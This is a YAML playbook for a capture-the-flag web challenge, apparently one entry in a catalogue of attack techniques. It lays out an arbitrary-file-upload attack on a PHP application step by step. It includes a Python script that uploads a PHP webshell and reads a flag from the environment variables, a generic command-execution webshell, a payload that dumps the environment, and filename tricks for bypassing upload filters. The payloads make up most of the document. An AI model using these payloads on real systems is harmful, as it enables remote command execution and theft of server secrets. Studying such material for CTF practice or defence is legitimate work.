name: arbitrary_file_upload_webshell
category: web
tags: [file_upload, webshell, rce, environment_variables]
indicators:
  - "File upload functionality"
  - "No file type validation"
  - "Uploaded files accessible via web"
  - "PHP application"

tricks:
  - name: "Step 1: Discover upload functionality"
    when: "First access"
    how: "Observe functionality"
    payload: |
      # Page: Image Upload
      # Hint: Check environment variables
      # Dockerfile: ENV FLAG=$FLAG

  - name: "Step 2: Identify vulnerability"
    when: "Analyze source code"
    how: "Find missing validation"
    payload: |
      $full_path = $path . basename($_FILES["userfile"]["name"]);
      move_uploaded_file($_FILES['userfile']['tmp_name'], $full_path);
      # No file type check! No extension validation!

  - name: "Step 3: Upload PHP webshell"
    when: "Confirmed no validation"
    how: "Upload PHP file to read env"
    payload: |
      # shell.php:
      <?php echo getenv("FLAG"); ?>

  - name: "Step 4: Extract the flag"
    when: "Execute attack"
    how: "Upload and access webshell"
    payload: |
      php_code = '<?php echo getenv("FLAG"); ?>'
      files = {'userfile': ('shell.php', php_code, 'application/x-php')}
      requests.post('http://TARGET/index.php', files=files, data={'submit': 'Upload Image'})

      resp = requests.get('http://TARGET/upload/shell.php')
      # FLAG{...}

  - name: "Alternative: Other webshell techniques"
    when: "Different scenarios"
    how: "Use different payloads"
    payload: |
      <?php system($_GET['cmd']); ?>  # shell.php?cmd=env
      <?php print_r($_ENV); ?>        # All env vars

  - name: "Bypass file type checks"
    when: "File validation exists"
    how: "Use bypass techniques"
    payload: |
      shell.php.jpg      # Double extension
      shell.PHP          # Case bypass
      shell.php%00.jpg   # Null byte (PHP < 5.3)
